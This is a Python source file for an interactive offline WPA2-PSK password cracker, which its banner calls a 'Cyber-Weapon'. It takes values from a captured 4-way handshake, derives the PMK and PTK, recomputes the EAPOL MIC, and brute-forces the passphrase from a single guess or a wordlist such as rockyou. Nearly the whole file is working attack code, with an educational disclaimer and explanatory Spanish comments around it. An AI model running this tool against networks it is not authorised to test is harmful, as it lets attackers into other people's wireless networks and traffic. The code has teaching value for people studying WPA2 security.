import hmac,hashlib
import scapy
from scapy.all import *
from pbkdf2 import PBKDF2
import binascii
import os

#######################################################################################
#
# BANNER
#

def banner():
    print(f"#################################################################################################")
    print(f"#                                                                                               #")
    print(f"#           {WHITE}@@@@@@@@@@@@@@@@@@{RESET}               ((_.-'-.| WPA2-PSK Password MIC Cracker |.-'-._))  #")
    print(f"#         {WHITE}@@@Fz3r0@@@@@@@@@@@@@@@{RESET}                                                               #")
    print(f"#       {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}          - Offline WPA2-PSK Passphrase Bruteforce Attack -  #")
    print(f"#      {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}                                                            #")
    print(f"#     {WHITE}@@@@@@@@@@@@@@@/      \\@@@/   @{RESET}        [+] Cyber-Weapon:............. WPA2-PSK Cracker    #")
    print(f"#    {WHITE}@@@@@@@@@@@@@@@@\\  {RED}O{WHITE}   @@  @ {RED}O{WHITE} @{RESET}        [+] Version:.................. 3.6                 #")
    print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@@  | \\@@@@@{RESET}      [+] Author:................... Fz3r0               #")
    print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@\\__@_/@@@@@{RESET}      [+] Github:................... github.com/Fz3r0    #")
    print(f"#     {WHITE}@@@@@@@@@@@@@@@/,/,/./'/_|.\\'\\,\\{RESET}       [+] Twitter:.................. @Fz3r0_OPs          #")
    print(f"#       {WHITE}@@@@@@@@@@@@@|  | | | | | | | |{RESET}      [+] Youtube:.................. @Fz3r0_OPs          #")
    print(f"#                   {WHITE}\\_|_|_|_|_|_|_|_|{RESET}                                                           #")
    print(f"#                                                                                               #")
    print(f"#################################################################################################")

#######################################################################################
#
# SEPARATOR LINES
#

def line():
    print(f"\n{BRIGHT_LIME}{BOLD}================================================================================================={RESET}\n")

def line2():
    print(f"\n{BRIGHT_LIME}{BOLD}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{RESET}\n")

#######################################################################################
#
# DISCLAIMER
#

def disclaimer():
    line()
    print(f"{BOLD}{WHITE}###{RED} DISCLAIMER:{RESET}\n")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} The tool is developed exclusively for educational purposes and authorized security engagements.")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} Use is strictly limited to controlled environments.")       
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} The author assume no responsibility for any misuse of this tool.")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} Unauthorized or unethical usage is strictly discouraged.")
    line()

#######################################################################################
#
# CLOSE PROGRAM
#

def close_program():

    clear_screen()     
    banner()
    line()
    print(f"{BOLD}{WHITE}###{RED} CLOSING PROGRAM:{RESET}\n")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} Thank you for using WPA2-PSK Cracker!!! \n")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} I hope this tool was useful for someone.")       
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} and please, don't forget to enjoy your days...")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} ...It is getting dark... so dark... \n")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} In the mist of the night you could see me come,")
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} where shadows move and Demons lie... \n")  
    print(f"{WHITE}[{RED}!{WHITE}]{RESET} I am Fz3r0 💀 and the Sun no longer rises.") 
    line()

#######################################################################################
#
# TERMINAL COLORS
#

# Colors Definitions
MAGENTA = '\033[95m'               # Magenta (neón)
CYAN = '\033[96m'                  # Cian (neón)
YELLOW = '\033[93m'                # Amarillo (neón)
GREEN = '\033[92m'                 # Verde (neón)
RED = '\033[91m'                   # Rojo (neón)
WHITE = '\033[97m'                 # Blanco brillante
LIME = '\033[38;5;10m'             # Lima (neón)
PURPLE = '\033[38;5;129m'          # Morado (neón)
ORANGE = '\033[38;5;214m'          # Naranja (neón)
BRIGHT_BLUE = '\033[38;5;81m'      # Azul brillante
PINK = '\033[38;5;213m'            # Rosa brillante
TEAL = '\033[38;5;38m'             # Teal (agua marina) brillante
NEON_YELLOW = '\033[38;5;226m'     # Amarillo neón
NEON_GREEN = '\033[38;5;46m'       # Verde neón
BRIGHT_ORANGE = '\033[38;5;202m'   # Naranja brillante
VIVID_RED = '\033[38;5;196m'       # Rojo vivo
BRIGHT_MAGENTA = '\033[38;5;201m'  # Magenta brillante
VIVID_BLUE = '\033[38;5;27m'       # Azul vivo
NEON_PINK = '\033[38;5;198m'       # Rosa neón
NEON_PURPLE = '\033[38;5;93m'      # Púrpura neón
BRIGHT_LIME = '\033[38;5;118m'     # Lima brillante
VIBRANT_CYAN = '\033[38;5;51m'     # Cian vibrante
ELECTRIC_GREEN = '\033[38;5;40m'   # Verde eléctrico
BRIGHT_AQUA = '\033[38;5;14m'      # Aqua brillante
SUNSHINE_YELLOW = '\033[38;5;227m' # Amarillo soleado
HOT_PINK = '\033[38;5;199m'        # Rosa fuerte
NEON_ORANGE = '\033[38;5;208m'     # Naranja neón
VIVID_TURQUOISE = '\033[38;5;45m'  # Turquesa vivo
ELECTRIC_BLUE = '\033[38;5;39m'    # Azul eléctrico
RESET = '\033[0m'                  # Resetear color
# Bold Style Definition
BOLD = '\033[1m'

#######################################################################################
#
# CLEAR SCREEN
#

# Function: Clear Screen
def clear_screen():
    # Detect the operating system
    if os.name == 'nt':  # For Windows
        os.system('cls')
    else:  # For Linux and Mac
        os.system('clear')


#######################################################################################
#
# VARIABLES
#

## Variables Globales
wordlist = "/popo.txt" 

## CLASS: Clase de variables que necesita el 4-Way-Handshake:
class WPA2Handshake:
    ssid = ''
    macAP = ''
    macCli = ''
    anonce = ''
    snonce = ''
    mic = ''
    passw = ''
    Eapol2frame = ''

#######################################################################################
#
# FORMULARIO DE VARIABLES
#

## Function: Ingresar Valores de Variables en shell
def testdata():

    ## Instructions
    line()
    print(f"{BOLD}{WHITE}###{RED} INSTRUCTIONS:{RESET} \n")
    print (f"[!] IMPORTANT: To collect the data -> Open the .pcap frame capture of the WPA2-PSK (Personal) authentication in Blackshark and extract the following:{RESET}")

    ## SSID   (Default: Fz3r0::CWAP
    print(f"\n[+] Paste the SSID of the WLAN               / or Press Enter to use Default{RESET}") 
    WPA2Handshake.ssid        = input(f"{BOLD}{WHITE}->>{RESET}") or "Fz3r0::CWAP"

    ## AP     (Default: Telmex
    print(f"\n[+] Paste the WLAN Address of the AP (BSSID) / or Press Enter to use Default{RESET}")
    WPA2Handshake.macAP       = input(f"{BOLD}{WHITE}->>{RESET}") or "50:4e:dc:90:2e:b8"

    ## STA    (Default: Xiaomi Phone
    print(f"\n[+] Paste the WLAN Address of client STA    / or Press Enter to use Default{RESET}")
    WPA2Handshake.macCli      = input(f"{BOLD}{WHITE}->>{RESET}") or "3c:13:5a:f2:46:88"

    ## Anonce (Default: M1 nonce (nonce from the AP/Authenticator)
    print(f"\n[+] Paste the Anonce - EAPOL M1 HEX Nonce - AP/Authenticator Nonce")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {NEON_YELLOW}Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M1 Nonce, Right Click, Copy > As HEX Stream")
    WPA2Handshake.anonce      = input(f"{BOLD}{WHITE}->>{RESET}") or "f1b3a392f9a10693e031deb0edb996c27974f297c7963c005a5cd36116c80777"

    ## Snonce = M2 nonce (nonce from the STA/Supplicant)  
    print(f"\n[+] Paste the Snonce - EAPOL M2 HEX Nonce  - STA/Supplicant Nonce")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M2 Nonce, Right Click, Copy > As HEX Stream")
    WPA2Handshake.snonce      = input(f"{BOLD}{WHITE}->>{RESET}") or "a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0"

    ## MIC   
    print("\n[+] Paste the MIC (e.g. EAPOL M2 MIC)  :: ")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Hint: Copy 'HEX Stream' from Blackshark / Select EAPOL M2 MIC, Right Click, Copy > As HEX Stream")
    WPA2Handshake.mic         = input(f"{BOLD}{WHITE}->>{RESET}") or "07d2e88db2254f675d349996ef95ad93"

    # EAPOL 2 Frame > Only Payload (No Headers or FCS)
    print(f"\n[+] Paste only the payload of EAPOL2 Frame in HEX (excuding MAC Header, LLC and FCS)")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Hint: To copy 'HEX stream' of EAPOL 2 frame payload, you should select ONLY the 802.1X Information Element of the M2 (the last 'directory' of the frame), you should NOT copy the entire 802.11 frame.")
    WPA2Handshake.Eapol2frame = input(f"{BOLD}{WHITE}->>{RESET}") or "0103007b02010a00000000000000000001a3911874480ff4e4b772c016d107ace5e0fb5fd972e5deeae1f662edeb8b4fc0000000000000000000000000000000000000000000000000000000000000000007d2e88db2254f675d349996ef95ad93001c301a0100000fac040100000fac040100000fac0280400000000fac06"

    clear_screen()
    banner()

#######################################################################################
#
# FORMULARIO DE PASSWORD MANUAL
#

## Function: Ingresar Valores de Variables en shell
def testpassword():

    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} Input the password you wish to audit or press Enter to use the default (Hunter2006).")    
    WPA2Handshake.passw = input(f"{BOLD}{WHITE}->>{RESET}") or "Hunter2006"  

#######################################################################################
#
# VER VARIABLES EN SHELL
#
 
# Visualize Variables in Shell
def viewdata():
    line()
    print(f"{BOLD}{WHITE}###{RED} EAPOL M1 & M2 data:{RESET}\n")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {NEON_YELLOW}4-Way-Handshake (EAPOL M1 & M2) data needed for MIC validation & cracking:{RESET}\n")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} SSID:............................. ", f"{PURPLE}{WPA2Handshake.ssid}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MAC Address (AP):................. ", f"{TEAL}{str(WPA2Handshake.macAP)}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MAC Address (STA):................ ", f"{ORANGE}{str(WPA2Handshake.macCli)}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} Anonce (AP):...................... ", f"{TEAL}{WPA2Handshake.anonce}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} Snonce (STA):..................... ", f"{ORANGE}{WPA2Handshake.snonce}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} MIC (EAPOL M2):................... ", f"{MAGENTA}{WPA2Handshake.mic}{RESET}")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} EAPOL M2 Payload:................. ", f"{CYAN}{WPA2Handshake.Eapol2frame}{RESET}")
    line()

####################################################################################################################
#
# Function: Algoritmo PRF512 (Para obtener PTK)

    ## Explicación general:

        # Esta función realiza la operación de Pseudo-Random Function (PRF) utilizando el algoritmo HMAC-SHA1 para generar una salida de longitud fija (512 bits) 

        # a partir de una clave (pmk), un texto (text), y datos adicionales (key_data). 

        # Este tipo de función es fundamental en el proceso de creación de la Pairwise Transient Key (PTK) en el protocolo WPA2, el cual se usa para cifrar las comunicaciones entre un dispositivo y el punto de acceso Wi-Fi.

def customPRF512(pmk, text, key_data):
    # Inicializamos el contador c, que se utilizará para iterar y modificar la entrada del HMAC-SHA1
    c = 0
    
    # Definimos el tamaño del bloque de salida que queremos obtener, 64 bytes (512 bits)
    block = 64
    
    # Creamos un objeto vacío de tipo bytes donde se acumularán los resultados del HMAC
    result = bytes()
    
    # Ejecutamos el ciclo mientras c sea menor o igual al número de iteraciones necesarias para generar los 512 bits.
    # El cálculo ((block * 8 + 159) / 160) nos da cuántas veces tenemos que generar un HMAC-SHA1 para cubrir los 512 bits,
    # ya que cada iteración genera 160 bits (20 bytes). La adición de 159 asegura que se redondee hacia arriba.
    while c <= ((block * 8 + 159) / 160):
        
        # Generamos un nuevo HMAC-SHA1 en cada iteración. 
        # La clave del HMAC es la pmk (Pairwise Master Key), derivada de la contraseña Wi-Fi.
        # El mensaje para el HMAC es la concatenación de:
        # 1. `text`, que es un valor que pasamos a la función.
        # 2. `chr(0x00).encode()`, que es un separador nulo en formato bytes.
        # 3. `key_data`, que es información adicional.
        # 4. `chr(c).encode()`, que es el valor del contador `c` convertido en un byte. Esto asegura que cada bloque generado sea único.
        hmacsha1 = hmac.new(pmk, text + chr(0x00).encode() + key_data + chr(c).encode(), hashlib.sha1)
        
        # El resultado de la función hmacsha1.digest() devuelve un bloque de 20 bytes (160 bits).
        # Vamos concatenando el resultado de cada iteración al objeto result.
        result = result + hmacsha1.digest()
        
        # Incrementamos el valor de c para la siguiente iteración, permitiendo que se genere un nuevo bloque.
        c += 1
    
    # Finalmente, devolvemos los primeros `block` bytes (64 bytes, 512 bits) del resultado acumulado.
    # Aunque generemos más de 512 bits, solo los primeros 512 bits son los que nos interesan.
    return result[:block]

####################################################################################################################
#
# MAIN: INICIO DEL PROGRAMA - ENTRAR Y SALIR BASICAMENTE

# main
def main():

    while True:

        clear_screen()        
        banner()
        disclaimer()

        print(f"{BOLD}{WHITE}###{RED} WELCOME TO WPA-PSK PASSWORD MIC CRACKER by Fz3r0!{RESET} \n")
        print(f"{YELLOW}Please select an option and press Enter to proceed....{RESET} \n")
        print(f"{WHITE}[{BRIGHT_BLUE}0{WHITE}]{RESET} Launch Fz3r0 MIC Cracker")
        print(f"{WHITE}[{BRIGHT_BLUE}9{WHITE}]{RESET} Exit \n")

        # el try lo uso para poder loopear las instrcciones de manera limpia
        try:

            # input de usuario (0-entrar / 9-salir)
            opt = int(input(f"{BOLD}{WHITE}->>{RESET} "))
            line()
            
            # [9] = Salir
            if opt == 9:

                close_program()
                exit()
            
            # [0] = Entrar -> Manda a testdata y crackmode
            elif opt == 0:

                clear_screen()
                banner()

                testdata()
                crackmode()

            # 
            else:
                print("Invalid selection.")

        except ValueError:
            print("Error: Invalid input.")

####################################################################################################################
#
# AUDIT TYPE SELECION: ORQUESTADOR DEL TIPO DE AUDITORIA

def crackmode():

    while True: 

        clear_screen()        
        banner()
        viewdata()
            
        print(f"{BOLD}{WHITE}###{RED} ATTACK SELECTION:{RESET} \n")
        print(f"{WHITE}[{BRIGHT_BLUE}0{WHITE}]{RESET} - Manual Password Check")
        print(f"{WHITE}[{BRIGHT_BLUE}1{WHITE}]{RESET} - Bruteforce Password Attack")
        print(f"{WHITE}[{BRIGHT_BLUE}9{WHITE}]{RESET} - Back to Main Menu \n")
            
        # el try lo uso para poder loopear las instrcciones de manera limpia
        try:
            
            # Prompt the user to select an option
            opt = int(input(f"{BOLD}{WHITE}->>{RESET} "))
            line()

            # @ Main
            if opt == 9:
                print("Returning to main menu...\n")  
                main()  
            
            # @ BruteForce
            elif opt == 1:
                print("Initiating Bruteforce attack...\n") 
                checkPasswdWordlist()  
            
            # @ Manual
            elif opt == 0:
                print("Initiating Manual attack...\n") 
                manualpassword()  

            # 
            else:
                print("Invalid selection. Please enter 0 to launch the MIC Cracker or 9 to exit.")

        except ValueError:
            print("Error: Invalid input. Please enter a valid number (0 or 9).")


def manualpassword():



    testpassword()

    clear_screen()        
    banner()
    viewdata()

    print(f"{BOLD}{WHITE}###{RED} Manual PSK Passphrase Selection:{RESET}\n")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} PSK Passphrase to Audit:..........  {RED}{WPA2Handshake.passw}{RESET}")  
    line()
                
    checkPasswd()  


def calculate_pmk(passphrase, ssid):
    """
    Función para calcular el Pairwise Master Key (PMK) a partir de la passphrase y el SSID.
    """
    print(f"{BOLD}{WHITE}###{RED} PMK (Pairwise Master Key) DERIVATION || PBKDF2 KDF (Key Derivation Function): \n")
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}PMK = 256-bit Key derived from Passphrase & SSID using PBKDF2, provides the foundation for RSNA keys in WPA2 authentication.{RESET}")    
    print(f"{WHITE}[{NEON_YELLOW}?{WHITE}]{RESET} {YELLOW}The PMK derives the PTK, which divides into -> KCK for MIC integrity; KEK for EAPOL message encryption; TK for data encryption; and MIC keys for data integrity.{RESET} \n")    
    print(f"{BOLD}{WHITE}PMK Formula -->{RESET} {BOLD} {GREEN}PBKDF2 {WHITE}= {WHITE}({RED}Passphrase {WHITE}+ {PURPLE}SSID{WHITE}) & {CYAN}4096 iterations >> {PINK}read(32byte){RESET} \n")
    print(f"{BOLD}{WHITE}PMK ={RESET} ({RED}{passphrase}{WHITE} + {PURPLE}{ssid}{WHITE}) &  {CYAN}4096 iterations >> {PINK}read(32byte){RESET} \n")

    # Formula para PMK:
    PMK = PBKDF2(passphrase, ssid, 4096).read(32)

    # Imprimir PMK:
    print(f"{BOLD}{WHITE}###{RED} PMK Result:\n")
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}]{RESET} PMK:................... {WHITE}{BOLD}" + str(PMK.hex()))
    print()

    return PMK


def generate_ptk(PMK):
    """
    Función para calcular el Pairwise Temporal Key (PTK) a partir del PMK.
    """
    print(f"{WHITE}[{NEON_GREEN}+{WHITE}Generating PTK...{RESET}")
    print()

    ## 1. Extraer MAC de AP y quitar ":" para la operación
    macAPparsed = WPA2Handshake.macAP.replace(":","").lower()
    macAPparsed = binascii.a2b_hex(macAPparsed)
    
    ## 2. Extraer MAC de STA y quitar ":" para la operación
    macCliparsed = WPA2Handshake.macCli.replace(":","").lower()
    macCliparsed = binascii.a2b_hex(macCliparsed)
    
    ## 3. Extraer Anonce (AP) de M1 EAPOL
    anoncep = binascii.a2b_hex(WPA2Handshake.anonce)

    ## 4. Extraer Snonce (STA) de M1 EAPOL
    snoncep = binascii.a2b_hex(WPA2Handshake.snonce)

    ## 5. Calcular y concatenar el Key Data
    key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)

    # Variable "txt"
    txt = b"Pairwise key expansion"

    # Imprimir Key Data en HEx
    print("key data: " + binascii.b2a_hex(key_data).decode())
    print()

    print("[-] Running PRF512 algorithm...")
    print()

    PTK = customPRF512(PMK, txt, key_data)
    print("Pairwise Temporal Key (PTK): " + str(PTK.hex()))
    print()
    
    return PTK




def calculate_mic(ptk, eapol_frame):


    #################################################################################################
    #
  
    ## CALCULAR Y MOSTRAR MIC

    # Esta función está realizando un ataque tipo "offline handshake", 
    # en el cual se intenta calcular el MIC con una clave propuesta (derivada del PTK), 
    # y compararlo con el MIC del paquete capturado (EAPOL frame).


    # Muestra un mensaje indicando que se está empezando el cálculo del MIC. 

    print("#   Calculando MIC   #")


    # 1. ExtraER KCK del PTK y mostrarla:
    print("1. ExtraER KCK del PTK:") 
    print("    - Se extrae la KCK (Key Confirmation Key) de los primeros 16 bytes del PTK (Pairwise Transient Key).")
    print("    - La KCK siempre tiene una longitud de 16 bytes, que es suficiente para la generación del MIC.")
    print()
    print("[*] KCK: ")

    KCK = ptk[0:16]
    print(KCK)  
    print()
    line() 






    # 2. Poner en 0 en valor del MIC
    print("2. Poner en 0 en valor del MIC") 
    print("    - Para poder recalcular el MIC, el campo que lo contiene en el mensaje debe 'anularse' (o 'poner a cero') antes de hacer el cálculo.") 
    print("    - Si no se pusiera en 0, no se podría recalcular el MIC ya que el valor anterior interferiría.")  
    print("    - De esta manera, el cálculo solo se basará en los otros datos del frame, junto con la Passphrase que estás probando.") 
    print()

    # * Formula para poner en 0 (anular) el valor del MIC calculado:
        # - WPA2Handshake.Eapol2frame[:162] : Toma los primeros 162 bytes del frame original antes del campo MIC.
        # - 32*"0" :                          Reemplaza el campo MIC con 32 caracteres "0" (equivalente a 16 bytes en hexadecimal).
        # - WPA2Handshake.Eapol2frame[194:]:  Toma el resto del frame después del campo MIC, desde el byte 194 hasta el final.
        #     ** Esto crea una copia del frame EAPOL donde el campo MIC está lleno de ceros, lo que te permite recalcularlo desde cero correctamente.



    eapol2data = WPA2Handshake.Eapol2frame[:162]+(32*"0")+WPA2Handshake.Eapol2frame[194:]















    # * Muestra el frame EAPOL antes de ser modificado, lo cual es útil para verificar que estamos trabajando con el frame correcto. 
    #   Esto es para fines de depuración

    # * Muestra el frame EAPOL antes de ser modificado, resaltando el MIC en magenta
    print("[-] EAPOL M2 (Message 2) :: Antes de poner a 0 el MIC:")

    # Imprimimos la primera parte (sin cambios)
    print(WPA2Handshake.Eapol2frame[:162], end="")

    # Imprimimos el valor original del MIC en magenta
    print(f"{MAGENTA}{WPA2Handshake.Eapol2frame[162:194]}{RESET}", end="")

    # Imprimimos el resto del frame (sin cambios)
    print(WPA2Handshake.Eapol2frame[194:])
    print()

    # * Formula para poner en 0 (anular) el valor del MIC calculado:
    #   - WPA2Handshake.Eapol2frame[:162] : Toma los primeros 162 bytes del frame original antes del campo MIC.
    #   - 32*"0" :                          Reemplaza el campo MIC con 32 caracteres "0" (equivalente a 16 bytes en hexadecimal).
    #   - WPA2Handshake.Eapol2frame[194:]:  Toma el resto del frame después del campo MIC, desde el byte 194 hasta el final.
    eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]

    # * Muestra el frame EAPOL después de ser modificado, resaltando los ceros en magenta
    print("[-] EAPOL M2 (Message 2) :: Después de poner a 0 el MIC:")

    # Imprimimos la primera parte (sin cambios)
    print(WPA2Handshake.Eapol2frame[:162], end="")

    # Imprimimos los 32 ceros reemplazados en color magenta
    print(f"{MAGENTA}{'0' * 32}{RESET}", end="")

    # Imprimimos el resto del frame (sin cambios)
    print(WPA2Handshake.Eapol2frame[194:])
    print()

    # 3. Calcular el MIC
    # - Muestra que ahora se va a proceder con el cálculo del MIC.
    print("    [2] Calculando MIC desde 0 utilizando HMAC y KCK como clave para el algoritmo HMAC:")
    print("")
    
    # * Formula para calcular MIC
    # - Descripción:                  Aquí se está calculando el MIC utilizando HMAC (Hash-based Message Authentication Code) .
    #                                 MIC = {hmac (KCK, EAPOL 2 Frame con MIC en 0, hashlib.sha1)}
    # -                               Se utiliza la KCK como clave para el algoritmo HMAC.
    # - binascii.a2b_hex(eapol2data): Convierte la versión hexadecimal del eapol2data en formato binario, que es lo que espera el algoritmo HMAC.
    # - hashlib.sha1:                 Se utiliza SHA-1 como función hash para generar el HMAC.
    # - .digest()[:16]:               El resultado de digest() genera un hash de 20 bytes (SHA-1), pero solo se toman los primeros 16 bytes porque es el tamaño requerido para el MIC.
    




    calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]

    return calculated_mic




def checkPasswd():


    # 1. Calcular el PMK
    PMK = calculate_pmk(WPA2Handshake.passw, WPA2Handshake.ssid)

    # 2. Generar el PTK a partir del PMK
    PTK = generate_ptk(PMK)

    # traer resultado de calculated min
    calculated_mic = calculate_mic(PTK, WPA2Handshake.Eapol2frame)


    # 5. Calcular el MIC
    print("        [*] MIC Calculada :  "+str(calculated_mic.hex()))
    print("        [*] MIC capturada :  "+str(WPA2Handshake.mic))
    print("")


    # 6. Comparar ambos MIC, si coinciden será password correcto
    if calculated_mic.hex() == WPA2Handshake.mic:
        print("")
        print("####################")
        print("# Password Correct #")
        print("####################")
        print("")

    else: 
        print("")
        print("######################")
        print("# Password Incorrect #")
        print("######################")
        print("") 
        
     # Preguntar al usuario qué desea hacer
    print("What would you like to do next?")
    print("1. Go to main")
    print("2. Try another password")
    print("3. Exit")
    
    choice = input("Please enter a number (1-3): ").strip()

    if choice == "1":
        main()  

    elif choice == "2":
        checkPasswd()  

    elif choice == "3":
        close_program()
        exit() 

    else:
        print("Invalid choice. Exiting program.")
        exit()   









#
# OPCION BRUTE FORCE


def checkPasswdWordlist():

    # Solicitar la ruta del wordlist si se desea cambiar el default
    wordlist_path = input("Ingrese la ruta del wordlist (presione Enter para usar '/usr/share/wordlists/rockyou.txt'): ")
    if not wordlist_path:
        wordlist_path = '/home/fz3r0/Documents/4-way-handshake-generator/popo.txt'

    # Verificar que el archivo de wordlist existe
    if not os.path.isfile(wordlist_path):
        print(f"No se encontró el archivo de wordlist en: {wordlist_path}")
        return

    # Leer el wordlist y probar cada palabra como contraseña
    with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
        for passw_wordlist in wordlist_file:
            passw_wordlist = passw_wordlist.strip()  # Quitar espacios en blanco

            # Limpiar la pantalla antes de mostrar el siguiente intento
            #os.system('clear')  # En Windows usa 'cls' en lugar de 'clear'
            #banner()
            print()
            print(f"Brute forcing:: {passw_wordlist}")

            # Generar PMK
            #print("\n[+] Generating PMK via PBKDF2...\n")
            PMK = PBKDF2(passw_wordlist, WPA2Handshake.ssid, 4096).read(32)
            print("Pairwise Master Key (PMK): " + str(PMK.hex()) + "\n")

            # Generar PTK
            #print("\n[+] Generating PTK...\n")
            macAPparsed = binascii.a2b_hex(WPA2Handshake.macAP.replace(":", "").lower())
            macCliparsed = binascii.a2b_hex(WPA2Handshake.macCli.replace(":", "").lower())
            anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
            snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
            key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
            txt = b"Pairwise key expansion"
            PTK = customPRF512(PMK, txt, key_data)
            print("Pairwise Temporal Key (PTK): " + str(PTK.hex()) + "\n")

            # Calcular y mostrar MIC
            print("\n######################")    
            print("#   Calculando MIC   #")
            print("######################\n")
            KCK = PTK[0:16]
            eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
            calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
            print("MIC Calculada:  " + str(calculated_mic.hex()))
            print("MIC capturada:  " + str(WPA2Handshake.mic) + "\n")

            # Comparar MICs
            if calculated_mic.hex() == WPA2Handshake.mic:
                print("\n####################")
                print("# Password Correct #")
                print("####################\n")
                return  # Detener la función si se encuentra la contraseña correcta
            else:
                print("\n######################")
                print("# Password Incorrect #")
                print("######################\n")





if __name__ == "__main__":
    main()
